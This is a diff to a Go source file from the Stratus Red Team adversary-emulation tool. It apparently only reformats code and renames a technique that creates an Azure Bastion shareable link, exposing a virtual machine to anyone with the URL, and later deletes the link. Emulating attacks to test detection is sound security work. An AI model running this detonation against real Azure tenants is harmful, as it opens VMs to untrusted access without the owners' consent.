@@ -3,11 +3,11 @@ package azure
 import (
 	"context"
 	_ "embed"
+	"fmt"
+	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/network/armnetwork/v6"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
 	"log"
-	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/network/armnetwork/v6"
-	"fmt"
 )
 
 //go:embed main.tf
@@ -17,7 +17,7 @@ func init() {
 	const codeBlock = "```"
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
 		ID:           "azure.persistence.create-bastion-shareable-link",
-		FriendlyName: "Access Virtual Machine using Bastion shareable link",
+		FriendlyName: "Create Azure VM Bastion shareable link",
 		Description: `
 By utilizing the 'shareable link' feature on Bastions where it is enabled, an attacker can create a link to allow access to a virtual machine (VM) from untrusted networks. Public links generated for an Azure Bastion can allow VM network access to anyone with the generated URL.
 
@@ -31,6 +31,7 @@ Warm-up:
 
 - Create a VM and VNet
 - Create an Azure Bastion host with access to the VM, and shareable links enabled
+
 NOTE: Warm-up and cleanup can each take 10-15 minutes to create and destroy the Azure Bastion instance
 
 Detonation: 
@@ -108,16 +109,10 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 
 	// Create Bastion shareable link
 	// Reference method: https://learn.microsoft.com/en-us/rest/api/virtualnetwork/put-bastion-shareable-link/put-bastion-shareable-link
-	log.Println("Getting Bastion shareable link for VM " +vmName)
+	log.Println("Getting Bastion shareable link for VM " + vmName)
 
 	poller, err := client.NewManagementClient().BeginPutBastionShareableLink(ctx, resourceGroup, bastionName, armnetwork.BastionShareableLinkListRequest{
-		VMs: []*armnetwork.BastionShareableLink{
-			{
-				VM: &armnetwork.VM{
-					ID: &vmId,
-				},
-			},
-		},
+		VMs: []*armnetwork.BastionShareableLink{{VM: &armnetwork.VM{ID: &vmId}}},
 	}, nil)
 	if err != nil {
 		return fmt.Errorf("failed to create shareable link: %v", err)
@@ -159,14 +154,9 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 	log.Println("Deleting shareable Bastion link to VM " + vmName)
 
 	poller, err := client.NewManagementClient().BeginDeleteBastionShareableLink(ctx, resourceGroup, bastionName, armnetwork.BastionShareableLinkListRequest{
-		VMs: []*armnetwork.BastionShareableLink{
-			{
-				VM: &armnetwork.VM{
-					ID: &vmId,
-				},
-			},
-		},
-	}, nil)
+		VMs: []*armnetwork.BastionShareableLink{{
+			VM: &armnetwork.VM{ID: &vmId}},
+		}}, nil)
 	if err != nil {
 		return fmt.Errorf("failed to delete shareable bastion link: %v", err)
 	}
